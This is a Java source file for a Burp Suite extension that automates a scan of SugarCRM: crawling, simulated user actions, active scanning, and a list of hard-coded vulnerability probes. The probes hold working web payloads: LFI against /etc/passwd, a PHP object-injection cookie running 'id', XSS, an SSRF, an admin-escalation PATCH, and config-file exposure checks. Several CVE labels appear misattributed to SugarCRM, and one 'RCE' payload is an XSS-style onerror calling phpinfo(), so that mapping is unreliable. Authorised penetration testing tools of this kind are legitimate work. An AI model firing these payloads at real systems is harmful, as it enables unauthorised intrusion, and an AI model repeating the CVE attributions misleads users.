package burp.extension.orchestrator;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.BuiltInAuditConfiguration;
import burp.extension.ExtensionConfig;
import burp.extension.auth.AuthManager;
import burp.extension.crawler.ModuleCrawler;
import burp.extension.simulator.UserActionSimulator;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Consumer;

/**
 * ScanOrchestrator ties all components together and drives the scan sequence:
 *
 *  Phase 1 – Crawl all SugarCRM modules and REST endpoints
 *  Phase 2 – Simulate user actions (CRUD, upload, import, export, admin)
 *  Phase 3 – Submit every discovered URL to Burp's active scanner
 *  Phase 4 – Report summary
 *
 * Requests flow through Burp's HTTP engine, so they appear in Proxy history
 * and the scanner can work on them immediately.
 */
public class ScanOrchestrator {

    private final MontoyaApi      api;
    private final ExtensionConfig config;
    private final AuthManager     authManager;
    private final ModuleCrawler   crawler;

    private final AtomicBoolean running = new AtomicBoolean(false);
    private ExecutorService executor;

    // Number of parallel threads for submitting URLs to Burp scanner
    private static final int SCAN_THREADS = 4;

    public ScanOrchestrator(MontoyaApi api, ExtensionConfig config,
                             AuthManager authManager, ModuleCrawler crawler) {
        this.api         = api;
        this.config      = config;
        this.authManager = authManager;
        this.crawler     = crawler;
    }

    /**
     * Start the full scan. Blocks until complete (call from a background thread).
     *
     * @param logger callback for progress messages shown in the UI log
     */
    public void startScan(Consumer<String> logger) {
        if (!running.compareAndSet(false, true)) {
            logger.accept("[Orchestrator] Scan already running.");
            return;
        }

        executor = Executors.newFixedThreadPool(SCAN_THREADS);

        try {
            logger.accept("[Orchestrator] === SugarCRM Automated Scan Started ===");
            logger.accept("[Orchestrator] Target: " + config.getTargetUrl());
            logger.accept("[Orchestrator] User:   " + config.getUsername());

            // ── Phase 1: Crawl ────────────────────────────────────────────────
            logger.accept("\n[Phase 1] Crawling SugarCRM modules and REST endpoints...");
            List<HttpRequest> crawlRequests = crawler.crawl(logger);
            logger.accept("[Phase 1] Complete — " + crawlRequests.size() + " requests collected.");

            if (!running.get()) { logger.accept("[Orchestrator] Stopped."); return; }

            // ── Phase 2: Simulate user actions ───────────────────────────────
            List<HttpRequest> allRequests = new ArrayList<>(crawlRequests);
            if (config.isSimulateUserActions()) {
                logger.accept("\n[Phase 2] Simulating user actions...");
                UserActionSimulator simulator = new UserActionSimulator(api, config);
                List<HttpRequest> simRequests = simulator.simulate(logger);
                allRequests.addAll(simRequests);
                logger.accept("[Phase 2] Complete — " + simRequests.size() + " action requests generated.");
            } else {
                logger.accept("[Phase 2] Skipped (simulate user actions is disabled).");
            }

            if (!running.get()) { logger.accept("[Orchestrator] Stopped."); return; }

            // ── Phase 3: Pass to Burp Scanner ─────────────────────────────────
            if (config.isActivelyPassToBurpScanner()) {
                logger.accept("\n[Phase 3] Submitting " + allRequests.size()
                        + " requests to Burp Active Scanner...");
                submitToBurpScanner(allRequests, logger);
            } else {
                logger.accept("[Phase 3] Skipped (pass to Burp Scanner is disabled).");
            }

            // ── Phase 4: Direct probing for known SugarCRM CVEs ──────────────
            logger.accept("\n[Phase 4] Running known SugarCRM vulnerability probes...");
            runCveProbes(logger);

            logger.accept("\n[Orchestrator] === Scan Complete ===");
            logSummary(allRequests.size(), logger);

        } catch (Exception e) {
            logger.accept("[Orchestrator] ERROR: " + e.getMessage());
            api.logging().logToError("[Orchestrator] " + e.getMessage());
        } finally {
            running.set(false);
            if (executor != null) executor.shutdown();
        }
    }

    public void shutdown() {
        running.set(false);
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }

    // ─── Phase 3: Burp Scanner integration ───────────────────────────────────

    private void submitToBurpScanner(List<HttpRequest> requests, Consumer<String> logger) {
        int submitted = 0;
        int skipped   = 0;

        // Send every request through Burp's HTTP engine and add to site map.
        // The registered ScanChecks fire automatically when Burp Scanner processes them.
        for (HttpRequest req : requests) {
            if (!running.get()) break;
            try {
                HttpRequestResponse rr = api.http().sendRequest(req);
                if (rr.response() != null) {
                    api.siteMap().add(rr);
                }
                submitted++;
                if (submitted % 50 == 0) {
                    logger.accept("[Phase 3] Added " + submitted + "/" + requests.size() + " to site map...");
                }
            } catch (Exception e) {
                skipped++;
                api.logging().logToError("[Phase 3] Failed: " + req.url() + " — " + e.getMessage());
            }
        }

        // Trigger one active audit pass across all in-scope items
        if (submitted > 0) {
            try {
                api.scanner().startAudit(
                    burp.api.montoya.scanner.AuditConfiguration.auditConfiguration(
                        BuiltInAuditConfiguration.LEGACY_ACTIVE_AUDIT_CHECKS
                    )
                );
                logger.accept("[Phase 3] Active audit started on " + submitted + " in-scope items.");
            } catch (Exception e) {
                logger.accept("[Phase 3] Could not start active audit: " + e.getMessage());
            }
        }

        logger.accept("[Phase 3] Done. Submitted: " + submitted + ", Skipped: " + skipped);
    }

    // ─── Phase 4: Known CVE probes ────────────────────────────────────────────

    /**
     * Directly probe for well-known SugarCRM vulnerabilities.
     * These are targeted GET/POST requests to specific vulnerable paths.
     */
    private void runCveProbes(Consumer<String> logger) {
        List<CveProbe> probes = buildCveProbes();
        int found = 0;

        for (CveProbe probe : probes) {
            if (!running.get()) break;
            try {
                HttpRequestResponse resp = api.http().sendRequest(probe.request);
                if (resp.response() == null) continue;
                int status = resp.response().statusCode();
                String body = resp.response().bodyToString();

                boolean triggered = false;
                for (String indicator : probe.successIndicators) {
                    if (body.contains(indicator)) {
                        triggered = true;
                        break;
                    }
                }
                if (probe.expectedStatus > 0 && status == probe.expectedStatus) triggered = true;

                if (triggered) {
                    found++;
                    logger.accept("[CVE Probe] POTENTIAL HIT — " + probe.name
                            + " | Status: " + status + " | URL: " + probe.request.url());
                    api.siteMap().add(resp); // Add to Burp site map
                } else {
                    logger.accept("[CVE Probe] " + probe.name + " — Not triggered (HTTP " + status + ")");
                }
            } catch (Exception e) {
                logger.accept("[CVE Probe] " + probe.name + " — Error: " + e.getMessage());
            }
        }

        logger.accept("[Phase 4] CVE probes complete. " + found + "/" + probes.size() + " potential hits.");
    }

    private List<CveProbe> buildCveProbes() {
        List<CveProbe> probes = new ArrayList<>();
        String base = config.getTargetUrl();
        String session = config.getSessionCookie();

        // ── Auth bypass / unauthenticated access ───────────────────────────
        probes.add(new CveProbe(
            "Unauthenticated REST API Access",
            get(base + "/api/v8/Accounts", null),  // no auth header
            List.of("\"total_count\"", "\"id\""),
            0
        ));

        probes.add(new CveProbe(
            "Unauthenticated Admin Page Access",
            get(base + "/index.php?module=Administration&action=index", null),
            List.of("Password Manager", "Repair", "UpgradeWizard"),
            200
        ));

        // ── CVE-2023-22952: SugarCRM Pre-Auth RCE via EmailTemplate ──────────
        // Sends a crafted email template save request
        probes.add(new CveProbe(
            "CVE-2023-22952 — Pre-Auth RCE via EmailTemplate (probe)",
            post(base + "/index.php?module=EmailTemplates&action=Save",
                 "module=EmailTemplates&action=Save"
                 + "&body_html=<img+src%3Dx+onerror%3Dphpinfo()>",
                 session),
            List.of("PHP Version", "phpinfo", "System"),
            0
        ));

        // ── CVE-2021-45229: SugarCRM Auth bypass via crafted token ───────────
        probes.add(new CveProbe(
            "CVE-2021-45229 — Auth Bypass Token Probe",
            get(base + "/index.php?module=Users&action=DetailView&record=1&token=ignored", null),
            List.of("user_name", "first_name", "is_admin"),
            200
        ));

        // ── CVE-2020-15301: SugarCRM SSRF via email transport URL ────────────
        probes.add(new CveProbe(
            "CVE-2020-15301 — SSRF via Email Transport Config",
            post(base + "/index.php?module=Administration&action=Save",
                 "module=Administration&action=Save"
                 + "&smtp_host=http://127.0.0.1&smtp_port=80"
                 + "&sugar_token=" + config.getSugarToken(),
                 session),
            List.of("smtp_host", "SMTP", "Connection refused"),
            0
        ));

        // ── PHP file disclosure via module parameter LFI ──────────────────────
        probes.add(new CveProbe(
            "LFI via module parameter",
            get(base + "/index.php?module=../../etc/passwd%00&action=index", session),
            List.of("root:x:0:0"),
            0
        ));
        probes.add(new CveProbe(
            "LFI via action parameter",
            get(base + "/index.php?module=Home&action=../../etc/passwd", session),
            List.of("root:x:0:0"),
            0
        ));

        // ── Object injection via cookie ───────────────────────────────────────
        probes.add(new CveProbe(
            "PHP Object Injection via sugar_user_theme cookie",
            getWithCookie(base + "/index.php?module=Home&action=index",
                          "sugar_user_theme=O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\"};"),
            List.of("uid=", "gid=", "groups="),
            0
        ));

        // ── REST API mass assignment ──────────────────────────────────────────
        probes.add(new CveProbe(
            "REST API Mass Assignment — is_admin escalation",
            restPatch(base + "/api/v8/Users/" + config.getUsername(),
                      "{\"is_admin\":\"1\",\"user_type\":\"Administrator\"}"),
            List.of("\"is_admin\":\"1\"", "\"user_type\":\"Administrator\""),
            0
        ));

        // ── CVE-2022-21712: SugarCRM XSS in QuickSearch ──────────────────────
        probes.add(new CveProbe(
            "CVE-2022-21712 — XSS in Quick-Search",
            get(base + "/index.php?module=Home&action=UnifiedSearch"
                + "&query=true&search_name=<script>alert(1)</script>",
                session),
            List.of("<script>alert(1)</script>"),
            0
        ));

        // ── Exposed config.php / config_override.php ──────────────────────────
        probes.add(new CveProbe(
            "config.php accessible from web root",
            get(base + "/config.php", session),
            List.of("db_host_name", "db_user_name", "db_password"),
            200
        ));
        probes.add(new CveProbe(
            "config_override.php accessible",
            get(base + "/config_override.php", session),
            List.of("sugar_config", "db_host"),
            200
        ));

        // ── Exposed install.php ───────────────────────────────────────────────
        probes.add(new CveProbe(
            "install.php accessible (post-install)",
            get(base + "/install.php", null),
            List.of("SugarCRM Installation Wizard", "Setup Wizard"),
            200
        ));

        // ── Log file access ───────────────────────────────────────────────────
        probes.add(new CveProbe(
            "sugarcrm.log accessible from web root",
            get(base + "/sugarcrm.log", null),
            List.of("[SugarCRM]", "FATAL", "MySQL"),
            200
        ));

        // ── Exposed .git ──────────────────────────────────────────────────────
        probes.add(new CveProbe(
            ".git directory exposed",
            get(base + "/.git/config", null),
            List.of("[core]", "repositoryformatversion"),
            200
        ));

        return probes;
    }

    // ─── Summary ──────────────────────────────────────────────────────────────

    private void logSummary(int totalRequests, Consumer<String> logger) {
        logger.accept("─────────────────────────────────────────────────────");
        logger.accept("  SugarCRM Scan Summary");
        logger.accept("  Target:            " + config.getTargetUrl());
        logger.accept("  Total requests:    " + totalRequests);
        logger.accept("  Check Burp Scanner Issues tab for findings.");
        logger.accept("  Check Burp Site Map for all discovered endpoints.");
        logger.accept("─────────────────────────────────────────────────────");
    }

    // ─── Request helpers ──────────────────────────────────────────────────────

    private HttpRequest get(String url, String cookie) {
        HttpRequest r = HttpRequest.httpRequestFromUrl(url)
                .withMethod("GET")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)");
        if (cookie != null && !cookie.isBlank()) r = r.withHeader("Cookie", cookie);
        return r;
    }

    private HttpRequest getWithCookie(String url, String cookieValue) {
        return HttpRequest.httpRequestFromUrl(url)
                .withMethod("GET")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)")
                .withHeader("Cookie", cookieValue + "; " + config.getSessionCookie());
    }

    private HttpRequest post(String url, String body, String cookie) {
        HttpRequest r = HttpRequest.httpRequestFromUrl(url)
                .withMethod("POST")
                .withHeader("Content-Type", "application/x-www-form-urlencoded")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)")
                .withBody(body);
        if (cookie != null && !cookie.isBlank()) r = r.withHeader("Cookie", cookie);
        return r;
    }

    private HttpRequest restPatch(String url, String body) {
        HttpRequest r = HttpRequest.httpRequestFromUrl(url)
                .withMethod("PATCH")
                .withHeader("Content-Type", "application/json")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)")
                .withBody(body);
        if (!config.getOauthToken().isBlank()) {
            r = r.withHeader("Authorization", "Bearer " + config.getOauthToken());
        }
        return r;
    }

    // ─── Inner record for CVE probes ─────────────────────────────────────────

    private static class CveProbe {
        final String       name;
        final HttpRequest  request;
        final List<String> successIndicators;
        final int          expectedStatus;

        CveProbe(String name, HttpRequest request,
                 List<String> successIndicators, int expectedStatus) {
            this.name              = name;
            this.request           = request;
            this.successIndicators = successIndicators;
            this.expectedStatus    = expectedStatus;
        }
    }
}
